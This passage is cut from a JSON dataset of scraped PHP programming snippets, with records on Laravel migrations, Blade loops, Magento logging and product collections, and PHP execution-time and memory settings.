    "description": "@foreach ($users as $user)     @if ($loop->first)         This is the first iteration.     @endif      @if ($loop->last)         This is the last iteration.     @endif      <p>This is user {{ $user->id }}</p> @endforeach\n<ul> @foreach ($pages as $page)     <li>{{ $loop->iteration }}: {{ $page->title }}         @if ($page->hasChildren())         <ul>         @foreach ($page->children() as $child)             <li>{{ $loop->parent->iteration }}.{{ $loop->iteration }}:                 {{ $child->title }}</li>         @endforeach         </ul>         @endif     </li> @endforeach </ul>\nProperty\t\t\tDescription $loop->index\t\tThe index of the current loop iteration (starts at 0). $loop->iteration\tThe current loop iteration (starts at 1). $loop->remaining\tThe iterations remaining in the loop. $loop->count\t\tThe total number of items in the array being iterated. $loop->first\t\tWhether this is the first iteration through the loop. $loop->last\t\t\tWhether this is the last iteration through the loop. $loop->even\t\t\tWhether this is an even iteration through the loop. $loop->odd\t\t\tWhether this is an odd iteration through the loop. $loop->depth\t\tThe nesting level of the current loop. $loop->parent\t\tWhen in a nested loop, the parent's loop variable.\n",
    "reg_date": "2021-10-12T10:17:00.000Z"
  },
  {
    "id": 2855,
    "keyword": null,
    "link": null,
    "title": " lumen file upload",
    "description": "$request->file('photo')->move($destinationPath);  $request->file('photo')->move($destinationPath, $fileName);\n$file = $request->file('photo');\n",
    "reg_date": "2021-10-12T10:17:00.000Z"
  },
  {
    "id": 2856,
    "keyword": null,
    "link": null,
    "title": " lumen generate app key",
    "description": "$router->get('/key', function() {     return \\Illuminate\\Support\\Str::random(32); });\n",
    "reg_date": "2021-10-12T10:17:00.000Z"
  },
  {
    "id": 2857,
    "keyword": null,
    "link": null,
    "title": " lumen jwt",
    "description": "composer require tymon/jwt-auth \n",
    "reg_date": "2021-10-12T10:17:00.000Z"
  },
  {
    "id": 2858,
    "keyword": null,
    "link": null,
    "title": " mac php ini file path",
    "description": "command : php -i | grep php.ini\nsudo cp /private/etc/php.ini.default /private/etc/php.ini \n",
    "reg_date": "2021-10-12T10:17:01.000Z"
  },
  {
    "id": 2859,
    "keyword": null,
    "link": null,
    "title": " macos how host laravel website on localhost and intranet wifi",
    "description": "php artisan serve --host=192.168.1.29  # => Laravel development server started: <http://192.168.1.29:8000>\n",
    "reg_date": "2021-10-12T10:17:01.000Z"
  },
  {
    "id": 2860,
    "keyword": null,
    "link": null,
    "title": " macos install php 7.4",
    "description": "brew install php@7.4\n#php 5.6 is deprecated so to install it brew tap exolnet/homebrew-deprecated brew install php@5.6\n",
    "reg_date": "2021-10-12T10:17:01.000Z"
  },
  {
    "id": 2861,
    "keyword": null,
    "link": null,
    "title": " mage log magento 2",
    "description": "<?php   $writer = new \\Zend\\Log\\Writer\\Stream(BP . '/var/log/MYLOGFILE.log');   $logger = new \\Zend\\Log\\Logger();   $logger->addWriter($writer);   $logger->info('Your text message'); ?>\n<?php   $writer = new \\Zend\\Log\\Writer\\Stream(BP . '/var/log/logfile.log');   $logger = new \\Zend\\Log\\Logger();   $logger->addWriter($writer);   $logger->info('Simple Text Log'); // Simple Text Log   $logger->info('Array Log'.print_r($myArrayVar, true)); // Array Log ?>\n$writer = new \\Zend\\Log\\Writer\\Stream(BP . '/var/log/test.log'); $logger = new \\Zend\\Log\\Logger(); $logger->addWriter($writer); $logger->info('Your text message'); \nMage::log('message',null,'logfile.log',true); Mage::log(print_r($arr, 1), null, 'logfile.log',true);\n\\Magento\\Framework\\App\\ObjectManager::getInstance()->get(\\Psr\\Log\\LoggerInterface::class)->debug('Your message here');\n",
    "reg_date": "2021-10-12T10:17:01.000Z"
  },
  {
    "id": 2862,
    "keyword": null,
    "link": null,
    "title": " magento2 get product collection",
    "description": "<?php namespace Foungento\\Theme\\Block; class Theme extends \\Magento\\Framework\\View\\Element\\Template {         protected $_productCollectionFactory;              public function __construct(         \\Magento\\Backend\\Block\\Template\\Context $context,                 \\Magento\\Catalog\\Model\\ResourceModel\\Product\\CollectionFactory $productCollectionFactory,                 array $data = []     )     {             $this->_productCollectionFactory = $productCollectionFactory;             parent::__construct($context, $data);     }          public function getProductCollection()     {         $collection = $this->_productCollectionFactory->create();         $collection->addAttributeToSelect('*');         $collection->setPageSize(10); // fetching only 10 products         return $collection;     } } ?>  /*Display product collection in phtml file Print out the product collection in phtml file with the below code:*/  list.phtml $productCollection = $block->getProductCollection(); foreach ($productCollection as $product) {     print_r($product->getData());          echo \"<br>\"; }\n//to overwrite limit but you need first to increase your memory limit   $collection = Mage::getModel('catalog/product')->getCollection() ->addAttributeToSelect('*') // select all attributes ->setPageSize(5000) // limit number of results returned ->setCurPage(1); // set the offset (useful for pagination)  // we iterate through the list of products to get attribute values foreach ($collection as $product) {   echo $product->getName(); //get name   echo (float) $product->getPrice(); //get price as cast to float   echo $product->getDescription(); //get description   echo $product->getShortDescription(); //get short description   echo $product->getTypeId(); //get product type   echo $product->getStatus(); //get product status    // getCategoryIds(); returns an array of category IDs associated with the product   foreach ($product->getCategoryIds() as $category_id) {       $category = Mage::getModel('catalog/category')->load($category_id);       echo $category->getName();       echo $category->getParentCategory()->getName(); // get parent of category   }   //gets the image url of the product   echo Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_MEDIA).       'catalog/product'.$product->getImage();   echo $product->getSpecialPrice();   echo $product->getProductUrl();  //gets the product url   echo '<br />'; } \n",
    "reg_date": "2021-10-12T10:17:01.000Z"
  },
  {
    "id": 2863,
    "keyword": null,
    "link": null,
    "title": " magento2 memory limit",
    "description": "php -dmemory_limit=5G bin/magento setup:di:compile OR php -dmemory_limit=5G bin/magento setup:upgrade OR php -dmemory_limit=5G bin/magento ANY:CUSTOM_COMMAAND\n",
    "reg_date": "2021-10-12T10:17:01.000Z"
  },
  {
    "id": 2864,
    "keyword": null,
    "link": null,
    "title": " magento2 zend log",
    "description": "<?php   $writer = new \\Zend\\Log\\Writer\\Stream(BP . '/var/log/MYLOGFILE.log');   $logger = new \\Zend\\Log\\Logger();   $logger->addWriter($writer);   $logger->info('Your text message'); ?>\n\\Magento\\Framework\\App\\ObjectManager::getInstance()->get(\\Psr\\Log\\LoggerInterface::class)->debug('Your message here');\n",
    "reg_date": "2021-10-12T10:17:01.000Z"
  },
  {
    "id": 2865,
    "keyword": null,
    "link": null,
    "title": " magento 1.9 get all product",
    "description": "//to overwrite limit but you need first to increase your memory limit   $collection = Mage::getModel('catalog/product')->getCollection() ->addAttributeToSelect('*') // select all attributes ->setPageSize(5000) // limit number of results returned ->setCurPage(1); // set the offset (useful for pagination)  // we iterate through the list of products to get attribute values foreach ($collection as $product) {   echo $product->getName(); //get name   echo (float) $product->getPrice(); //get price as cast to float   echo $product->getDescription(); //get description   echo $product->getShortDescription(); //get short description   echo $product->getTypeId(); //get product type   echo $product->getStatus(); //get product status    // getCategoryIds(); returns an array of category IDs associated with the product   foreach ($product->getCategoryIds() as $category_id) {       $category = Mage::getModel('catalog/category')->load($category_id);       echo $category->getName();       echo $category->getParentCategory()->getName(); // get parent of category   }   //gets the image url of the product   echo Mage::getBaseUrl(Mage_Core_Model_Store::URL_TYPE_MEDIA).       'catalog/product'.$product->getImage();   echo $product->getSpecialPrice();   echo $product->getProductUrl();  //gets the product url   echo '<br />'; } \n",
    "reg_date": "2021-10-12T10:17:01.000Z"
  },
  {
    "id": 2866,
    "keyword": null,
    "link": null,
    "title": " magento 1.9 print blank page error",
    "description": "you have no any error find then try below code add top in index.php file  ini_set('error_reporting', E_ERROR); register_shutdown_function(\"fatal_handler\"); function fatal_handler() {     $error = error_get_last();     echo(\"<pre>\");     print_r($error); } after check it which line error showing it\n",
    "reg_date": "2021-10-12T10:17:01.000Z"
  },
  {
    "id": 2867,
    "keyword": null,
    "link": null,
    "title": " magento 2 create admin user",
    "description": "php bin/magento admin:user:create --admin-user=mageplaza --admin-password=WeLoveMagento --admin-email=hi@mageplaza.com --admin-firstname=Mageplaza --admin-lastname=Family \nphp bin/magento admin:user:create --admin-user=mageplaza --admin-password=WeLoveMagento --admin-email=hi@mageplaza.com --admin-firstname=Mageplaza --admin-lastname=Family\nphp bin/magento admin:user:create --admin-user=mageplaza --admin-password=WeLoveMagento123 --admin-email=hi@mageplaza.com --admin-firstname=Mageplaza --admin-lastname=Family \n",
    "reg_date": "2021-10-12T10:17:02.000Z"
  },
  {
    "id": 2868,
    "keyword": null,
    "link": null,
    "title": " magento 2 get all categories in array",
    "description": "create this file inside magento_project pub/category_tree.php <?php set_time_limit(0); ini_set('display_errors', 1); ini_set('memory_limit','1024M'); use Magento\\Framework\\App\\Bootstrap; include('../app/bootstrap.php');  $bootstrap = Bootstrap::create(BP, $_SERVER);  $objectManager = $bootstrap->getObjectManager();  $state = $objectManager->get('Magento\\Framework\\App\\State'); $state->setAreaCode('frontend');  $objectManager = \\Magento\\Framework\\App\\ObjectManager::getInstance(); // instance of object manager  $parentCategoryId = 2; // You have to set website root category id here    $category = $objectManager->create('Magento\\Catalog\\Model\\Category')->load($parentCategoryId);      $childCategory['parent']['name'] = $category->getName(); $childCategory['parent']['id'] = $category->getId();  $childCategory['parent'][\"child\"] = getCategory($parentCategoryId);   function getCategory($parentCatId) {     $objectManager = \\Magento\\Framework\\App\\ObjectManager::getInstance(); // instance of object manager      $categoryRepository = $objectManager->create('Magento\\Catalog\\Model\\CategoryRepository');     $parentcategories = $categoryRepository->get($parentCatId);     $categories = $parentcategories->getChildrenCategories();     $i=0;     $ChildCategoryValue = [];           foreach($categories as $category){         $ChildCategoryValue[$i] = ['name' => $category->getName(), 'id' => $category->getId()];         $childCat = getCategory($category->getId());         if($childCat){             $ChildCategoryValue[$i]['child'] = $childCat;         }            $i++;     }      return $ChildCategoryValue; }  echo '<pre>'; print_r($childCategory); echo '</pre>';  \n",
    "reg_date": "2021-10-12T10:17:02.000Z"
  },
  {
    "id": 2869,
    "keyword": null,
    "link": null,
    "title": " magento 2 get all category tree",
    "description": "create this file inside magento_project pub/category_tree.php <?php set_time_limit(0); ini_set('display_errors', 1); ini_set('memory_limit','1024M'); use Magento\\Framework\\App\\Bootstrap; include('../app/bootstrap.php');  $bootstrap = Bootstrap::create(BP, $_SERVER);  $objectManager = $bootstrap->getObjectManager();  $state = $objectManager->get('Magento\\Framework\\App\\State'); $state->setAreaCode('frontend');  $objectManager = \\Magento\\Framework\\App\\ObjectManager::getInstance(); // instance of object manager  $parentCategoryId = 2; // You have to set website root category id here    $category = $objectManager->create('Magento\\Catalog\\Model\\Category')->load($parentCategoryId);      $childCategory['parent']['name'] = $category->getName(); $childCategory['parent']['id'] = $category->getId();  $childCategory['parent'][\"child\"] = getCategory($parentCategoryId);   function getCategory($parentCatId) {     $objectManager = \\Magento\\Framework\\App\\ObjectManager::getInstance(); // instance of object manager      $categoryRepository = $objectManager->create('Magento\\Catalog\\Model\\CategoryRepository');     $parentcategories = $categoryRepository->get($parentCatId);     $categories = $parentcategories->getChildrenCategories();     $i=0;     $ChildCategoryValue = [];           foreach($categories as $category){         $ChildCategoryValue[$i] = ['name' => $category->getName(), 'id' => $category->getId()];         $childCat = getCategory($category->getId());         if($childCat){             $ChildCategoryValue[$i]['child'] = $childCat;         }            $i++;     }      return $ChildCategoryValue; }  echo '<pre>'; print_r($childCategory); echo '</pre>';  \n",
    "reg_date": "2021-10-12T10:17:02.000Z"
  },
  {
    "id": 2870,
    "keyword": null,
    "link": null,
    "title": " magento 2 get collection",
    "description": "<?php namespace Foungento\\Theme\\Block; class Theme extends \\Magento\\Framework\\View\\Element\\Template {         protected $_productCollectionFactory;              public function __construct(         \\Magento\\Backend\\Block\\Template\\Context $context,                 \\Magento\\Catalog\\Model\\ResourceModel\\Product\\CollectionFactory $productCollectionFactory,                 array $data = []     )     {             $this->_productCollectionFactory = $productCollectionFactory;             parent::__construct($context, $data);     }          public function getProductCollection()     {         $collection = $this->_productCollectionFactory->create();         $collection->addAttributeToSelect('*');         $collection->setPageSize(10); // fetching only 10 products         return $collection;     } } ?>  /*Display product collection in phtml file Print out the product collection in phtml file with the below code:*/  list.phtml $productCollection = $block->getProductCollection(); foreach ($productCollection as $product) {     print_r($product->getData());          echo \"<br>\"; }\n$om = \\Magento\\Framework\\App\\ObjectManager::getInstance(); $productCollection = $om->create('Magento\\Catalog\\Model\\ResourceModel\\Product\\Collection'); $collection = $productCollection->addAttributeToSelect('*')->load();\n",
    "reg_date": "2021-10-12T10:17:02.000Z"
  },
  {
    "id": 2871,
    "keyword": null,
    "link": null,
    "title": " magento 2 get loaded product by id",
    "description": "$om = \\Magento\\Framework\\App\\ObjectManager::getInstance(); $product = $om->create('Magento\\Catalog\\Model\\Product')->load($id);\n$productId = 20; $product = Mage::getModel('catalog/product')->load($productId);\n",
    "reg_date": "2021-10-12T10:17:02.000Z"
  },
  {
    "id": 2872,
    "keyword": null,
    "link": null,
    "title": " magento 2 in postman in get product in remove this symbol array",
    "description": "   \"product\": {     \"sku\": \"00004244\",     \"extension_attributes\": {     \t\"category_links\": [     \t\t{     \t\t\t\"position\": 0,     \t\t\t\"category_id\": \"2\"     \t\t},     \t\t{     \t\t\t\"position\": 1,     \t\t\t\"category_id\": \"42\"     \t\t},     \t\t{     \t\t\t\"position\": 2,     \t\t\t\"category_id\": \"52\"     \t\t},     \t\t{     \t\t\t\"position\": 3,     \t\t\t\"category_id\": \"56\"     \t\t}     \t]     },     \"custom_attributes\": [     \t{     \t\t\"attribute_code\": \"category_ids\",     \t\t\"value\": \"[]\"     \t}     ]   } \n",
    "reg_date": "2021-10-12T10:17:02.000Z"
  },
  {
    "id": 2873,
    "keyword": null,
    "link": null,
    "title": " magento 2 print php error",
    "description": "error_reporting(E_ALL); # Set Error Reporting as E_ALL (Report all PHP errors) ini_set('display_errors', 1); # Un-commenting this line to enable PHP error display \n",
    "reg_date": "2021-10-12T10:17:02.000Z"
  },
  {
    "id": 2874,
    "keyword": null,
    "link": null,
    "title": " magento debug white page",
    "description": "ini_set('error_reporting', E_ERROR); register_shutdown_function(\"fatal_handler\"); function fatal_handler() {     $error = error_get_last();     if ($error) {     \techo(\"<pre>\");     \tprint_r($error);     } } \n",
    "reg_date": "2021-10-12T10:17:02.000Z"
  },
  {
    "id": 2875,
    "keyword": null,
    "link": null,
    "title": " magic constant in php",
    "description": "<?php  echo \"It will return current line number: \".__LINE__; echo '<br>'; echo \"It will return full path of file: \".__FILE__; echo '<br>'; echo \"It will return directory of executed file: \".__DIR__; echo '<br>'; class Car { function demoMagic() { echo \"It will return name of function where magic constant included: \".__FUNCTION__; echo '<br>'; echo \"It will return name of class where magic constant included: \".__CLASS__;  echo '<br>'; echo \"It will return name of method with class where magic constant included: \".__METHOD__; } } $obj = new Car(); $obj->demoMagic();  ?>\nName\t        Description __LINE__\t    The current line number of the file. __FILE__\t    The full path and filename of the file with symlinks                  resolved. If used inside an include, the name of the                  included file is returned. __DIR__\t        The directory of the file. If used inside an include,                  the directory of the included file is returned. This is                  equivalent to dirname(__FILE__). This directory name                  does not have a trailing slash unless it is the root                  directory. __FUNCTION__\tThe function name. __CLASS__\t    The class name. The class name includes the namespace                  it was declared in (e.g. Foo\\Bar).  __TRAIT__\t    The trait name. The trait name includes the namespace                  it was declared in (e.g. Foo\\Bar). __METHOD__\t    The class method name. __NAMESPACE__\tThe name of the current namespace.\n",
    "reg_date": "2021-10-12T10:17:02.000Z"
  },
  {
    "id": 2876,
    "keyword": null,
    "link": null,
    "title": " maintenance mode",
    "description": "php artisan down\nSeedProd plugin : https://www.seedprod.com/\n",
    "reg_date": "2021-10-12T10:17:02.000Z"
  },
  {
    "id": 2877,
    "keyword": null,
    "link": null,
    "title": " maintenance mode laravel",
    "description": "env('APP_URL')\nphp artisan down\nif (\\Illuminate\\Support\\Facades\\App::environment('production')) {     // The environment is production }\n",
    "reg_date": "2021-10-12T10:17:02.000Z"
  },
  {
    "id": 2878,
    "keyword": null,
    "link": null,
    "title": " make a forign key in migrations using laravel 8",
    "description": "$table->unsignedBigInteger('user_id'); $table->foreign('user_id')->references('id')->on('users')->onDelete('cascade');\n$table->foreign('column_name')->references('id')->on('table_name')->onDelete('cascade');\nSchema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); });\n",
    "reg_date": "2021-10-12T10:17:03.000Z"
  },
  {
    "id": 2879,
    "keyword": null,
    "link": null,
    "title": " make a object php",
    "description": "$x = (object) [     'a' => 'test',     'b' => 'test2',     'c' => 'test3' ]; var_dump($x);  /* object(stdClass)#1 (3) {   [\"a\"]=>   string(4) \"test\"   [\"b\"]=>   string(5) \"test2\"   [\"c\"]=>   string(5) \"test3\" } */\n   $object = new stdClass();    $object->property = 'Here we go';     var_dump($object);    /*    outputs:     object(stdClass)#2 (1) {       [\"property\"]=>       string(10) \"Here we go\"     }    */\n//object init   $object = (object) [     'propertyOne' => 'foo',     'propertyTwo' => 42,   ];\n",
    "reg_date": "2021-10-12T10:17:03.000Z"
  },
  {
    "id": 2880,
    "keyword": null,
    "link": null,
    "title": " make cookies pph",
    "description": "setcookie(\"cookiename\", \"cookievalue\", time(), \".mydomain.tld\", \"/\")  // coookiename: The name of your cookie // cookievalue: The value of your cookie // Time: The expiration date of your cookie. If you plan to make a product for the EU, it's 13 months max. // .mydomain.tld: The domain that your webpage is using. You can only use the domain that the PHP file is on. Adding a dot before your domain will cover all subdomains. // \"/\": This is the folder where your cookie will apply. If you want a specific cookie for the /mySpecialSuperSecretPages folder, you have to set /mySpecialSuperSecretPages // Check the source for more options.\n",
    "reg_date": "2021-10-12T10:17:03.000Z"
  },
  {
    "id": 2881,
    "keyword": null,
    "link": null,
    "title": " make migration file in laravel",
    "description": "php artisan make:migration create_users_table --create=users  php artisan make:migration add_votes_to_users_table --table=users\nphp artisan make:migration create_flights_table\nphp artisan make:Model Status -m\nphp artisan make:model Employee -m\ngolang migrate create  migrate create -ext sql -dir db/migration -seq init_schema eg :migrate create -ext sql events\ncomposer require --dev \"xethron/migrations-generator\"\n",
    "reg_date": "2021-10-12T10:17:03.000Z"
  },
  {
    "id": 2882,
    "keyword": null,
    "link": null,
    "title": " make model controller in single command",
    "description": "# to make only Model Class php artisan make:model Customer  # to make resource controller php artisan make:controller CustomersController --resource  # make controller for already existing Model Class (binded to model) php artisan make:controller CustomersController --model=Customer  # to make  model, migration and controller all in one command php artisan make:model User -mcr # here m for migration, c for controller, r for resource methods in controller \n",
    "reg_date": "2021-10-12T10:17:03.000Z"
  },
  {
    "id": 2883,
    "keyword": null,
    "link": null,
    "title": " make pagination wordpress admin panel",
    "description": "// page parameter $pagenum = isset( $_GET['pagenum'] ) ? absint( $_GET['pagenum'] ) : 1; // Find total number of records  $limit = 10; // number of rows in page $offset = ( $pagenum - 1 ) * $limit; $total = $wpdb->get_var( \"SELECT COUNT(`id`) FROM {$wpdb->prefix}table_name\" ); $num_of_pages = ceil( $total / $limit );  // Give Limit $entries = $wpdb->get_results( \"SELECT * FROM {$wpdb->prefix}table_name LIMIT $offset, $limit\" );   // add this code where you want to add pagintaion $page_links = paginate_links( array(     'base' => add_query_arg( 'pagenum', '%#%' ),     'format' => '',     'prev_text' => __( '&laquo;', 'text-domain' ),     'next_text' => __( '&raquo;', 'text-domain' ),     'total' => $num_of_pages,     'current' => $pagenum ) );  if ( $page_links ) {     echo '<div class=\"tablenav\"><div class=\"tablenav-pages\" style=\"margin: 1em 0\">' . $page_links . '</div></div>'; } \n",
    "reg_date": "2021-10-12T10:17:03.000Z"
  },
  {
    "id": 2884,
    "keyword": null,
    "link": null,
    "title": " make select element readonly",
    "description": "select[readonly] {     pointer-events: none; } \n",
    "reg_date": "2021-10-12T10:17:03.000Z"
  },
  {
    "id": 2885,
    "keyword": null,
    "link": null,
    "title": " max execution time exceeded php",
    "description": "//place this before any script you want to calculate time $time_start = microtime(true);   //sample script for($i=0; $i<1000; $i++){  //do anything }  $time_end = microtime(true); $execution_time = ($time_end - $time_start); echo '<b>Total Execution Time:</b> '.($execution_time*1000).'Milliseconds'; \nini_set('max_execution_time', '300'); //300 seconds = 5 minutes\n",
    "reg_date": "2021-10-12T10:17:03.000Z"
  },
  {
    "id": 2886,
    "keyword": null,
    "link": null,
    "title": " max execution time php",
    "description": "//place this before any script you want to calculate time $time_start = microtime(true);   //sample script for($i=0; $i<1000; $i++){  //do anything }  $time_end = microtime(true); $execution_time = ($time_end - $time_start); echo '<b>Total Execution Time:</b> '.($execution_time*1000).'Milliseconds'; \nini_set ( 'max_execution_time', -1); //unlimit\nini_set ( 'max_execution_time', 1200); //1200 is time in secondss\n",
    "reg_date": "2021-10-12T10:17:03.000Z"
  },
  {
    "id": 2887,
    "keyword": null,
    "link": null,
    "title": " max input time in wordpress",
    "description": "@ini_set( 'max_input_vars' , 3000 );\n",
    "reg_date": "2021-10-12T10:17:03.000Z"
  },
  {
    "id": 2888,
    "keyword": null,
    "link": null,
    "title": " maximum execution time of 30 seconds exceeded",
    "description": "//change this in php.ini  max_execution_time = 500\nAnd Change xampp\\php\\php.ini to max_execution_time = 1000; or higher value\nini_set('max_execution_time', '300'); //300 seconds = 5 minutes\n// you need to add this line at the bottom of your .htaccess file Before # END WordPress Like this...  php_value max_execution_time 1000 # END WordPress\nA better solution here is to change the config that controls phpMyAdmin and not the php.ini file.  If you change the php.ini file you effect everything in PHP and should you write that infinite loop that we all do from time to time it will take longer to terminate your infinite loop than is sensible.  Note: If you are using the 64bit WAMPServer the base folder name will be wamp64 instead of wamp so please amend the below folder names accordingly.  So change \\wamp\\alias\\phpmyadmin.conf. By default it will look something like this although your version of phpMyAdmin will probably be different:  Alias /phpmyadmin \"c:/wamp/apps/phpmyadmin4.1.14/\"  <Directory \"c:/wamp/apps/phpmyadmin4.1.14/\">    Options Indexes FollowSymLinks MultiViews    AllowOverride all   <IfDefine APACHE24>     Require local   </IfDefine>   <IfDefine !APACHE24>     Order Deny,Allow       Deny from all       Allow from localhost ::1 127.0.0.1     </IfDefine>   php_admin_value upload_max_filesize 128M   php_admin_value post_max_size 128M   php_admin_value max_execution_time 360   php_admin_value max_input_time 360 </Directory> To extend the maximum time limit for importing a database, change the php_admin_value max_execution_time parameter. You may also need to change the other parameters as larger databases tend to come in larger files and take longer to read as well. Example:    php_admin_value upload_max_filesize 1024M   php_admin_value post_max_size 1024M   php_admin_value max_execution_time 1800   php_admin_value max_input_time 1800\n",
    "reg_date": "2021-10-12T10:17:04.000Z"
  },
  {
    "id": 2889,
    "keyword": null,
    "link": null,
    "title": " maximum execution time of 60 seconds exceeded laravel 8",
    "description": "ini_set('max_execution_time', 180); //3 minutes \n",
    "reg_date": "2021-10-12T10:17:04.000Z"
  },
  {
    "id": 2890,
    "keyword": null,
    "link": null,
    "title": " mcrypt php extension required",
    "description": "# 1) Create a Symbolic link to mcrypt.ini in PHP mods folder sudo ln -s /etc/php5/conf.d/mcrypt.ini /etc/php5/mods-available/mcrypt.ini # 2) Activate extension sudo php5enmod mcrypt # 3) Restart Apache sudo service apache2 restart\n",
    "reg_date": "2021-10-12T10:17:04.000Z"
  },
  {
    "id": 2891,
    "keyword": null,
    "link": null,
    "title": " mdf margin",
    "description": "<?php $mpdf = new \\Mpdf\\Mpdf([ \t\t\t'mode' => '', \t\t\t'format' => 'A4', \t\t\t'default_font_size' => 0, \t\t\t'default_font' => '', \t\t\t'margin_left' => 15, \t\t\t'margin_right' => 15, \t\t\t'margin_top' => 16, \t\t\t'margin_bottom' => 16, \t\t\t'margin_header' => 9, \t\t\t'margin_footer' => 9, \t\t\t'orientation' => 'P', \t\t]); $mpdf->WriteHTML('Hello World');  // Saves file on the server as 'filename.pdf' $mpdf->Output('filename.pdf', \\Mpdf\\Output\\Destination::FILE);\n",
    "reg_date": "2021-10-12T10:17:04.000Z"
  },
  {
    "id": 2892,
    "keyword": null,
    "link": null,
    "title": " memory limit php ini set",
    "description": " ini_set(\"memory_limit\",\"256M\"); \n",
    "reg_date": "2021-10-12T10:17:04.000Z"
  },
  {
    "id": 2893,
    "keyword": null,
    "link": null,
    "title": " merge collections laravel",
    "description": "/*   * The merge method merges the given array or collection with the original collection.  * If a string key in the given items matches a string key in the original collection,  * the given items's value will overwrite the value in the original collection:  */ $collection = collect(['product_id' => 1, 'price' => 100]); $merged = $collection->merge(['price' => 200, 'discount' => false]); $merged->all(); // ['product_id' => 1, 'price' => 200, 'discount' => false]  // If the given items's keys are numeric, the values will be appended to the end of the collection: $collection = collect(['Desk', 'Chair']); $merged = $collection->merge(['Bookcase', 'Door']); $merged->all(); // ['Desk', 'Chair', 'Bookcase', 'Door']\n$collection = collect(['product_id' => 1, 'price' => 100]);  $merged = $collection->merge(['price' => 200, 'discount' => false]);  $merged->all();  // ['product_id' => 1, 'price' => 200, 'discount' => false]\n$collection = collect(['name', 'age']);  $combined = $collection->combine(['George', 29]);  $combined->all();  // ['name' => 'George', 'age' => 29]\n",
    "reg_date": "2021-10-12T10:17:04.000Z"
  },
  {
    "id": 2894,
    "keyword": null,
    "link": null,
    "title": " merge two arrays one as key to another php",
    "description": "$output = array_merge($array1, $array2);\n// two arrays one become keys and second becomes values array_combine ( array $keys , array $values );\n$all_arrays = array_merge($array1, $array2, $array3, ...);\nInput : $a1=array(\"a\"=>\"raj\", \"b\"=>\"striver\");         $a2=array(\"z\"=>\"geeks\", \"b\"=>\"articles\"); Output :  Array (     [a] => raj     [b] => Array         (             [0] => striver             [1] => articles         )      [z] => geeks )\n",
    "reg_date": "2021-10-12T10:17:04.000Z"
  },
  {
    "id": 2895,
    "keyword": null,
    "link": null,
    "title": " merge two objects in php",
    "description": "array_merge((array)json_decode($data1), (array) json_decode($data2));\n",
    "reg_date": "2021-10-12T10:17:04.000Z"
  },
  {
    "id": 2896,
    "keyword": null,
    "link": null,
    "title": " merubah judul menjadi slug codeigniter",
    "description": "$route['produk/(:num)/([a-z]+)'] = 'HomeControl/detail_produk/$1';\n",
    "reg_date": "2021-10-12T10:17:04.000Z"
  },
  {
    "id": 2897,
    "keyword": null,
    "link": null,
    "title": " message\t\"Class 'Input' not found\"",
    "description": "Input facade definition from config/app.php hence you have to manually add that in to aliases array as below,  'Input' => Illuminate\\Support\\Facades\\Input::class,  Or You can import Input facade directly as required,  use Illuminate\\Support\\Facades\\Input;\n",
    "reg_date": "2021-10-12T10:17:04.000Z"
  },
  {
    "id": 2898,
    "keyword": null,
    "link": null,
    "title": " message mkdir() invalid path filename drivers/session files driver.php",
    "description": "change your application->config->config.php and set  $config['sess_driver'] = 'database'; $config['sess_cookie_name'] = 'ci_session'; $config['sess_expiration'] = 7200; $config['sess_save_path'] = 'ci_sessions'; $config['sess_match_ip'] = FALSE; $config['sess_time_to_update'] = 300; $config['sess_regenerate_destroy'] = FALSE; \n",
    "reg_date": "2021-10-12T10:17:04.000Z"
  },
  {
    "id": 2899,
    "keyword": null,
    "link": null,
    "title": " messed up pagination laravel",
    "description": "just make sure you have this in your AppServiceProvider:  use Illuminate\\Pagination\\Paginator;  public function boot() {      Paginator::useBootstrap(); } \n",
    "reg_date": "2021-10-12T10:17:04.000Z"
  },
  {
    "id": 2900,
    "keyword": null,
    "link": null,
    "title": " migrate specific migration laravel",
    "description": "php artisan migrate --path=/database/migrations/fileName.php\nphp artisan migrate --path=/database/migrations/2020_04_10_130703_create_test_table.php\nphp artisan migrate --path=/database/migrations/my_migration.php\nphp artisan migrate  --path=/database/migrations/selected\nphp artisan migrate:refresh --path=/database/migrations/fileName.php\nphp artisan migrate:refresh --path=/database/migrations/2021_06_23_093317_create_users_table.php\n",
    "reg_date": "2021-10-12T10:17:05.000Z"
  },
  {
    "id": 2901,
    "keyword": null,
    "link": null,
    "title": " migrate specific table laravel",
    "description": "php artisan migrate --path=/database/migrations/fileName.php\nphp artisan migrate --path=/database/migrations/2020_04_10_130703_create_test_table.php\nphp artisan migrate:refresh --path=/database/migrations/fileName.php\nphp artisan migrate:refresh --path=/database/migrations/2021_06_23_093317_create_users_table.php\n* To run a specific migration  php artisan migrate:refresh --path=/database/migrations/2019_03_23_165757_create_combined_1553343771_users_table.php    - Note: it will drop the table and create a new one.  \nphp artisan migrate --path=/database/migrations/migration_name/php\n",
    "reg_date": "2021-10-12T10:17:05.000Z"
  },
  {
    "id": 2902,
    "keyword": null,
    "link": null,
    "title": " migrate to an existing table in laravel commad",
    "description": "php artisan make:migration add_paid_to_users_table --table=users\nSchema::table('table_name', function (Blueprint $table) {             $table->string('column_name', 255)->nullable()->after('previous_column_name');         });\nTo Generate Laravel Migrations from an existing database.    Use the following package.    https://github.com/Xethron/migrations-generator\npublic function up() {     Schema::table('users', function($table) {         $table->integer('paid');     }); }\n",
    "reg_date": "2021-10-12T10:17:05.000Z"
  },
  {
    "id": 2903,
    "keyword": null,
    "link": null,
    "title": " migration bool type eloquent orm",
    "description": "$table->boolean('favicon')->default(0);\n",
    "reg_date": "2021-10-12T10:17:05.000Z"
  },
  {
    "id": 2904,
    "keyword": null,
    "link": null,
    "title": " migration create symfony",
    "description": " doctrine:migrations:generate               [generate] Generate a blank migration class. \n",
    "reg_date": "2021-10-12T10:17:05.000Z"
  },
  {
    "id": 2905,
    "keyword": null,
    "link": null,
    "title": " migration not found laravel",
    "description": "php artisan clear-compiled  php artisan optimize:clear composer dump-autoload php artisan optimize\n",
    "reg_date": "2021-10-12T10:17:05.000Z"
  },
  {
    "id": 2906,
    "keyword": null,
    "link": null,
    "title": " migration rename column laravel",
